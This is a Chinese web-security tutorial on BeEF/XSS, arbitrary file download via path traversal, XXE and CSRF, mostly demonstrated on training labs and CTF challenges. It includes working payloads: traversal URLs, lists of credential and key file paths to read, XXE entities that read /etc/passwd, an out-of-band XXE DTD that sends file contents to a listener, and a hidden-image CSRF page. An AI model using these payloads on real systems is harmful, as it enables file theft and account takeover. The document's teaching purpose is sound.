data-language="shell"><code class="language-shell"><span class="token function">apt-get</span> <span class="token function">install</span> beef-xss -y<span class="token comment"># 如果安装失败，先执行下面的命令</span><span class="token function">apt-get</span> update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="启停Beef"><a href="#启停Beef" class="headerlink" title="启停Beef"></a>启停Beef</h4><pre class="line-numbers language-none"><code class="language-none">beef-xssbeef-xss-stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首次启动时，需要设置一个登录账号和密码</p><h4 id="注入xss"><a href="#注入xss" class="headerlink" title="注入xss"></a>注入xss</h4><p>启动beef时，会弹出js的路径，将此路径构造成xss的payload注入即可</p><p><img src="/2023/012220963/133.PNG" alt="133"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在目标上线后，commands标签里有各种模块</p><p><img src="/2023/012220963/134.PNG" alt="134"></p><h5 id="执行任意JaveScript"><a href="#执行任意JaveScript" class="headerlink" title="执行任意JaveScript"></a>执行任意JaveScript</h5><p>在Misc -&gt; Raw JavaScript中可以执行任意js代码</p><p><img src="/2023/012220963/135.PNG" alt="135"></p><h5 id="获取Cookie"><a href="#获取Cookie" class="headerlink" title="获取Cookie"></a>获取Cookie</h5><p><img src="/2023/012220963/136.PNG" alt="136"></p><h5 id="社工利用"><a href="#社工利用" class="headerlink" title="社工利用"></a>社工利用</h5><p><img src="/2023/012220963/137.PNG" alt="137"></p><h2 id="任意文件下载读取漏洞"><a href="#任意文件下载读取漏洞" class="headerlink" title="任意文件下载读取漏洞"></a>任意文件下载读取漏洞</h2><h3 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>一些网站应用程序会提供用户下载文件的功能，如果下载文件的文件名或路径能够被用户所控制，就会</p><p>造成服务器中任意文件被下载的漏洞。</p><h4 id="利用危害"><a href="#利用危害" class="headerlink" title="利用危害"></a>利用危害</h4><p>用户可利用任意文件下载漏洞下载服务器日志文件、数据库配置文件、网站源代码、密码信息文件以及</p><p>接口信息文件。</p><p>漏洞不会直接对服务器造成影响，需要进一步的操作。</p><h3 id="漏洞演示-1"><a href="#漏洞演示-1" class="headerlink" title="漏洞演示"></a>漏洞演示</h3><p>pikachu靶场：unsafe filedownload</p><p>图片的下载链接：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/execdownload.php?filename=pj.png</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>图片链接：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/download/ns.png</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>分析：</p><p><img src="/2023/012220963/138.png" alt="138"></p><p>Get传参方式</p><p><img src="/2023/012220963/139.png" alt="139"></p><p>分析信息可知它有一个接口<strong>execdownload.php</strong>，在<strong>unsafedownload</strong>目录下，<strong>使用向上级跳转的方式，对其构造下载链接</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载之后，对文件内容进行代码审计,发现inc/function.php文件</p><p><img src="/2023/012220963/140.png" alt="140"></p><p>同时知道function.php文件相对于execdownload.php文件的路径为**../../inc/function.php**</p><p>构造function.php文件下载链接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">www<span class="token operator">.</span>pikachu<span class="token operator">.</span>com<span class="token operator">/</span>vul<span class="token operator">/</span>unsafedownload<span class="token operator">/</span>execdownload<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>inc<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对文件内容在进行代码审计即可，<strong>同时也可用该方法去下载其他文件，前提是文件名和路径的相关链接能构造出来</strong></p><h4 id="下载重要配置文件"><a href="#下载重要配置文件" class="headerlink" title="下载重要配置文件"></a>下载重要配置文件</h4><p>使用目录扫描工具去探测重要文件</p><p><img src="/2023/012220963/141.PNG" alt="141"></p><p>探测到重要的配置文件<strong>config.inc.php</strong></p><p>构造该文件的下载链接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//www.pikachu.com/vul/unsafedownload/execdownload.php?filename=../../../inc/config.inc.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载之后即可看到重要的信息</p><h3 id="漏洞查找"><a href="#漏洞查找" class="headerlink" title="漏洞查找"></a>漏洞查找</h3><p>如果文件下载时调用的接口含有如下参数名，则有可能存在任意文件下载漏洞</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 接口</span>read<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>down<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>download<span class="token operator">.</span>php<span class="token operator">?</span>filename<span class="token operator">=</span>readfile<span class="token operator">?</span>filename<span class="token operator">=</span>download<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>download<span class="token operator">.</span>php<span class="token operator">?</span>filepath<span class="token operator">=</span><span class="token operator">...</span><span class="token comment"># 参数</span><span class="token operator">&amp;</span>readpath<span class="token operator">=</span><span class="token operator">&amp;</span>filepath<span class="token operator">=</span><span class="token operator">&amp;</span>Path<span class="token operator">=</span><span class="token operator">&amp;</span>inputfile<span class="token operator">=</span><span class="token operator">&amp;</span>url<span class="token operator">=</span><span class="token operator">&amp;</span>Lang<span class="token operator">=</span><span class="token operator">&amp;</span>dis<span class="token operator">=</span><span class="token operator">&amp;</span>data<span class="token operator">=</span><span class="token operator">&amp;</span>readfile<span class="token operator">=</span><span class="token operator">&amp;</span>menu<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="系统常见配置文件位置"><a href="#系统常见配置文件位置" class="headerlink" title="系统常见配置文件位置"></a>系统常见配置文件位置</h3><p><strong>windows</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">C</span><span class="token punctuation">:</span>\boot<span class="token operator">.</span>ini                                 <span class="token comment"># 查看系统版本</span><span class="token constant">C</span><span class="token punctuation">:</span>\windows\System32\inetsrv\MetaBase<span class="token operator">.</span>xml     <span class="token comment"># IIS配置文件</span><span class="token constant">C</span><span class="token punctuation">:</span>\windows\repair\sam                       <span class="token comment"># 存储系统初次安装的密码</span><span class="token constant">C</span><span class="token punctuation">:</span>\Program Files\mysql\my<span class="token operator">.</span>ini               <span class="token comment"># Mysql配置</span><span class="token constant">C</span><span class="token punctuation">:</span>\Program Files\mysql\data\mysqlluser<span class="token operator">.</span><span class="token constant">MYD</span>   <span class="token comment"># Mysql root</span><span class="token constant">C</span><span class="token punctuation">:</span>\windows\php<span class="token operator">.</span>inc                           <span class="token comment"># php配置信息</span><span class="token constant">C</span><span class="token punctuation">:</span>\windows\my<span class="token operator">.</span>ini                           <span class="token comment"># Mysql配置信息</span><span class="token constant">C</span><span class="token punctuation">:</span>\windows\win<span class="token operator">.</span>ini                           <span class="token comment"># windows系统的一个基本系统配置文件</span><span class="token constant">C</span><span class="token punctuation">:</span>\windows\System32\drivers \etc\ hosts     <span class="token comment"># host文件位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Linux</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>authorized_keys                   <span class="token comment"># 服务器公钥</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>id_rsa                           <span class="token comment"># SSH私钥</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>ssh<span class="token operator">/</span>known_hosts                       <span class="token comment"># 记录每个访问计算机用户的公钥</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd                                 <span class="token comment"># 记录用户的一些基本属性</span><span class="token operator">/</span>etc<span class="token operator">/</span>shadow                                 <span class="token comment"># 记录用户加密后的密码</span><span class="token operator">/</span>etc<span class="token operator">/</span>my<span class="token operator">.</span>cnf                                 <span class="token comment"># Mysql配置文件</span><span class="token operator">/</span>etc<span class="token operator">/</span>httpd<span class="token operator">/</span>conf<span class="token operator">/</span> httpd<span class="token operator">.</span>conf                 <span class="token comment"># apache配置文件</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>bash_history                         <span class="token comment"># 用户历史命令记录文件</span><span class="token operator">/</span>root<span class="token operator">/</span><span class="token operator">.</span>mysql_history                         <span class="token comment"># Mysql历史命令记录文件</span><span class="token operator">/</span>porc<span class="token operator">/</span><span class="token keyword">self</span><span class="token operator">/</span>cmdline                           <span class="token comment"># 当前进程的cmdline参数</span><span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>arp                               <span class="token comment"># arp表，可以获得内网其他机器的地址</span><span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>route                             <span class="token comment"># 路由表信息</span><span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>tcp <span class="token keyword">and</span><span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>udp               <span class="token comment"># 活动连接的信息</span><span class="token operator">/</span>proc<span class="token operator">/</span>net<span class="token operator">/</span>fib_trie                           <span class="token comment"># 路由缓存</span><span class="token operator">/</span>proc<span class="token operator">/</span>version                               <span class="token comment"># 内核版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="RoarCTF 2019 Easy Java"></a>RoarCTF 2019 Easy Java</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">https<span class="token punctuation">:</span><span class="token comment">//buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>访问页面，在下面有一个 help的超链接</li></ol><p><img src="/2023/012220963/148.PNG" alt="148"></p><ol start="2"><li>访问该链接，提示一段报错信息</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileNotFoundException</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>help<span class="token punctuation">.</span>docx<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>改用POST方式传递参数，能够进行文件下载</li></ol><p><img src="/2023/012220963/142.PNG" alt="142"></p><ol start="4"><li>通过刚刚的报错信息，我们已经知道网站使用java语言开发</li></ol><p>​        JavaWeb网站的配置文件在 WEB-INF/web.xml 中，尝试下载，得到web.xml</p><p><img src="/2023/012220963/143.PNG" alt="143"></p><ol start="5"><li>在web.xml中有一个/Flag，去访问它，结果是500错误</li></ol><p><img src="/2023/012220963/144.PNG" alt="144"></p><ol start="6"><li>尝试下载FlagController的源码，源码路径在web.xml中</li></ol><p>在JavaWeb站点中，如果对方服务器使用WAR包部署，一定是符合以下结构</p><ul><li>WEB-INF</li><li><ul><li>classs</li><li><ul><li>com</li><li><ul><li>xx</li><li><ul><li>xx.class</li><li>yy.class</li></ul></li></ul></li></ul></li><li>lib</li><li><ul><li>xxxx.jar</li></ul></li><li>web.xml</li></ul></li><li>index.jsp</li><li>xxxx.jsp</li></ul><ol start="7"><li>构造FlagController下载的链接</li></ol><pre class="line-numbers language-url" data-language="url"><code class="language-url">.&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;wm&#x2F;ctf&#x2F;FlagController.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="8"><li>查看文件，发现加密字符串</li></ol><p><img src="/2023/012220963/146.PNG" alt="146"></p><ol start="9"><li>在线网站解密</li></ol><p><img src="/2023/012220963/147.PNG" alt="147"></p><h4 id="CVE-2021-36749-Druid-任意文件读取"><a href="#CVE-2021-36749-Druid-任意文件读取" class="headerlink" title="CVE-2021-36749 Druid 任意文件读取"></a>CVE-2021-36749 Druid 任意文件读取</h4><p>FOFA： title=”Apache Druid”        版本&lt;=0.22</p><p>Load data——HTTP(s)——Connect Data——URls</p><p>利用file:///协议进行读取</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/passwd       //eg:file协议读取</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/149.PNG" alt="149"></p><p><strong>注意：点到为止</strong></p><h2 id="XXE-amp-XML漏洞"><a href="#XXE-amp-XML漏洞" class="headerlink" title="XXE&amp;XML漏洞"></a>XXE&amp;XML漏洞</h2><h3 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h3><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><p>XML是一种用于标记电子文件使其具有结构性的<strong>标记语言</strong>。XML被设计为传输和存储数据。</p><p>XML文件格式是纯文本格式，在许多方面类似于HTML，XML由XML元素组成，每个XML元素包括一个</p><p>开始标记，一个结束标记以及两个标记之间的内容。标记是对文档存储格式和逻辑结构的描述。在形式</p><p>上，标记中可能包括注释、引用、字符数据段、起始标记、结束标记、空元素、文档类型声明（DTD）</p><p>序言。</p><p>简单的XML文件：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>具体规则如下：</strong></p><ol><li>必须有声明语句，XML声明是XML文档的第一句，其格式如下：</li></ol><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><p>大小写，在XML文档中，大小写是有区别的</p></li><li><p>XML文档有且只有一个根元素</p></li><li><p>属性值使用引号</p></li><li><p>有的标记必须有相应的结束标记</p></li><li><p>所有的空标记也必须被关闭，空标记是指标记对之间没有内容的标记。在XML中，规定所有的标记必</p><p>须有结束标记</p></li></ol><h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文</p><p>档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE note [    &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;note&gt;&amp;a;&lt;&#x2F;note&gt;&lt;!-- 定义一个实体 a，值为admin --&gt;&lt;!-- 等价于 ↓↓↓ --&gt;&lt;note&gt;admin&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>XXE是XML外部实体注入（<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity）的缩写。</p><p>一些应用程序在传递参数时，使用XML的格式进行数据传递，并且对传递的参数没有进行严格的过滤。</p><p>攻击者可以构造自己的恶意XML代码，使服务器在接收参数时解析任意的XML代码，导致产生服务器内</p><p>部文件被读取等后果。</p><h5 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h5><ul><li>文件读取</li><li>RCE</li><li>内网攻击</li><li>Dos攻击</li></ul><h3 id="XXE漏洞演示"><a href="#XXE漏洞演示" class="headerlink" title="XXE漏洞演示"></a>XXE漏洞演示</h3><p>Pikachu靶场 XXE漏洞</p><p>输入随意字符串：</p><p><img src="/2023/012220963/150.PNG" alt="150"></p><p>粘贴一下内容</p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;a.txt&quot;&gt;]&gt;&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/151.PNG" alt="151"></p><p>输出结果与我d:/a.txt中内容一致</p><h3 id="XXE漏洞攻击"><a href="#XXE漏洞攻击" class="headerlink" title="XXE漏洞攻击"></a>XXE漏洞攻击</h3><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><p><strong>windows:</strong></p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;a.txt&quot;&gt;]&gt;&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Linux:</strong></p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h5><p><strong>可通过延时判断端口开放情况</strong></p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [        &lt;!ENTITY content SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:3307&quot;&gt;]&gt;&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>一般情况：</strong>延时低的开放，延时高的未开放</p><h5 id="引入外部DTD"><a href="#引入外部DTD" class="headerlink" title="引入外部DTD"></a>引入外部DTD</h5><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % file SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;my.dtd&quot;&gt; %file;]&gt;&lt;name&gt;&amp;send;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>my.dtd</p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY send SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;a.txt&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>外部引入前提：</strong>服务器没有禁止引入外部DTD</p><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p>取消xxe的回显</p><p><img src="/2023/012220963/152.PNG" alt="152"></p><p>payload:</p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;d:&#x2F;a.txt&quot;&gt;    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;my2.dtd&quot;&gt;    %dtd;    %send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>my2.dtd</p><p><a href="http://127.0.0.1:8000为自己开启监听服务器，用于接收读取的数据">http://127.0.0.1:8000为自己开启监听服务器，用于接收读取的数据</a></p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload     &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:8000?data&#x3D;%file;&#39;&gt;&quot;&gt;%payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h3><ol><li>判断数据格式</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;user&gt;&lt;username&gt;&amp;content;&lt;&#x2F;username&gt;&lt;password&gt;adada&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/156.PNG" alt="153"></p><ol start="2"><li>判断Content-Type</li></ol><pre class="line-numbers language-none"><code class="language-none">text&#x2F;xmlapplication&#x2F;xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/157.PNG" alt="154"></p><ol start="3"><li>使用工具</li></ol><p>Xray,AWVS等工具均乐意扫描XXE</p><h3 id="XXE漏洞练习"><a href="#XXE漏洞练习" class="headerlink" title="XXE漏洞练习"></a>XXE漏洞练习</h3><h4 id="XXE-lab"><a href="#XXE-lab" class="headerlink" title="XXE-lab"></a>XXE-lab</h4><p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><p><img src="/2023/012220963/153.PNG" alt="155"></p><ol><li>随意输入数据发现UserName输出有回显</li></ol><p><img src="/2023/012220963/154.PNG" alt="156"></p><ol start="2"><li>进行burp抓包分析：该传输数据格式为XML</li></ol><p><img src="/2023/012220963/155.PNG" alt="157"></p><ol start="3"><li>发送到Repeater,进行测试</li></ol><p><img src="/2023/012220963/158.PNG" alt="158"></p><p>success!!!</p><h4 id="CTF-XXE-COURSE"><a href="#CTF-XXE-COURSE" class="headerlink" title="CTF XXE COURSE"></a>CTF XXE COURSE</h4><p><a href="https://buuoj.cn/challenges#BUU%20XXE%20COURSE%201">https://buuoj.cn/challenges#BUU%20XXE%20COURSE%201</a></p><p>第一行有回显，burp抓包处理</p><p><img src="/2023/012220963/159.PNG" alt="159"></p><p><img src="/2023/012220963/160.PNG" alt="160"></p><p><img src="/2023/012220963/161.PNG" alt="161"></p><h4 id="jarvisoj"><a href="#jarvisoj" class="headerlink" title="jarvisoj"></a>jarvisoj</h4><p><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>猜测，自己构造</p><pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [        &lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;node&gt;&lt;search&gt;&amp;content;&lt;&#x2F;search&gt;&lt;value&gt;password&lt;&#x2F;value&gt;&lt;&#x2F;node&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/012220963/162.PNG" alt="162"></p><p><strong>记得改Content-Type的内容</strong></p><h4 id="register"><a href="#register" class="headerlink" title="register"></a>register</h4><p><a href="https://github.com/jbarone/xxelab">https://github.com/jbarone/xxelab</a></p><p><img src="/2023/012220963/163.PNG" alt="163"></p><h3 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h3><ul><li>禁用引用外部实体DTD</li><li>过滤用户提交的XML数据</li></ul><h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><p>Cross-site request forgery 简称为“CSRF”。在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一</p><p>般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。</p><p>所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆，</p><p>更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。</p><p>CSRF危害：</p><ul><li>修改用户信息</li><li>利用身份发送邮件，短信</li><li>利用身份转账</li><li>盗取账号</li></ul><h3 id="CSRF-案例"><a href="#CSRF-案例" class="headerlink" title="CSRF 案例"></a>CSRF 案例</h3><p><strong>案例1：</strong></p><ol><li>登录B站，然后不关闭浏览器</li><li>在同一浏览器下访问链接：<a href="https://passport.bilibili.com/register/logout.html#/verify">https://passport.bilibili.com/register/logout.html#/verify</a></li></ol><p><strong>案例2：</strong></p><p><img src="/2023/012220963/164.PNG" alt="164"></p><ol><li>用户登录了银行网站，并且没有关闭浏览器</li><li>黑客给该用户发了一个钓鱼链接，并诱导用户点击</li></ol><p>​        链接内容：<a href="http://www.bank.com/transfer/?to=hacker&amp;money=10000">http://www.bank.com/transfer/?to=hacker&amp;money=10000</a></p><ol start="3"><li>用户在不知情的情况下，给陌生人转账10000元</li></ol><h3 id="CSRF-漏洞攻击"><a href="#CSRF-漏洞攻击" class="headerlink" title="CSRF 漏洞攻击"></a>CSRF 漏洞攻击</h3><p>环境：pikachu靶场 CSRF Get</p><p>工具：burpsuit</p><p>登录之后，在修改信息页抓包</p><p><img src="/2023/012220963/165.PNG" alt="165"></p><p>GET请求方式，原信息url链接为</p><pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;18656565545&amp;add&#x3D;usa&amp;email&#x3D;lili%40pikachu.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改信息接口</p><pre class="line-numbers language-url" data-language="url"><code class="language-url">http:&#x2F;&#x2F;www.pikachu.com&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;girl&amp;phonenum&#x3D;11111111111&amp;add&#x3D;UK&amp;email&#x3D;lili%40pikachu.com&amp;submit&#x3D;submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>or:</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=11111111111&amp;add=UK&amp;email=lili%40pikachu.com&amp;submit=submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>404 error<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在同一浏览器下测试链接</p><p><img src="/2023/012220963/166.PNG" alt="166"></p><p>信息被更改成功！！！</p><h3 id="CSRF-poc生成"><a href="#CSRF-poc生成" 